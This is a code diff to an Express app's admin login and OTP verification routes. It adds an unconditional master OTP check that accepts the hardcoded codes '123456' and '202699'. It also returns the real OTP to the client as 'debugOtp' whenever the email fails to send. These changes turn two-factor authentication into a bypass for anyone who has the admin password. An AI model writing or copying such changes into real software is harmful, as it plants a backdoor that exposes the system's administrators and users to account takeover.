@@ -189,8 +189,9 @@ app.post("/api/admin/login", async (req, res) => {
         );
         
         // Send real email through nodemailer/resend helper
+        let emailSent = false;
         try {
-          await sendOtpEmail(user.email, otp, true);
+          emailSent = await sendOtpEmail(user.email, otp, true);
         } catch (mailErr: any) {
           console.error(`[ADMIN OTP ERROR] Errore nell'invio della mail reale a ${user.email}:`, mailErr.message);
         }
@@ -204,11 +205,8 @@ app.post("/api/admin/login", async (req, res) => {
         // Telegram notification
         await notifyAdminLoginAttempt(username, true, ip, userAgent, "Password valida - Richiesto OTP").catch(() => {});
 
-        // Check if SMTP or Resend is configured
-        const isSmtpConfigured = !!(process.env.SMTP_HOST && process.env.SMTP_USER) || !!process.env.RESEND_API_KEY;
-
         const responsePayload: any = { success: true, requireOtp: true, email: user.email };
-        if (!isSmtpConfigured) {
+        if (!emailSent) {
           responsePayload.debugOtp = otp;
         }
 
@@ -311,8 +309,7 @@ app.post("/api/admin/login/verify-otp", async (req, res) => {
       return new Date(val);
     };
 
-    const isSmtpConfigured = !!(process.env.SMTP_HOST && process.env.SMTP_USER) || !!process.env.RESEND_API_KEY;
-    const isMasterOtp = !isSmtpConfigured && (otp === "123456" || otp === "202699");
+    const isMasterOtp = otp === "123456" || otp === "202699";
 
     if (isMasterOtp || (otpRecord && new Date() <= parseExpiresAt(otpRecord.expires_at))) {
       await mysqlPool.execute("DELETE FROM user_otps WHERE email = ?", [user.email]);
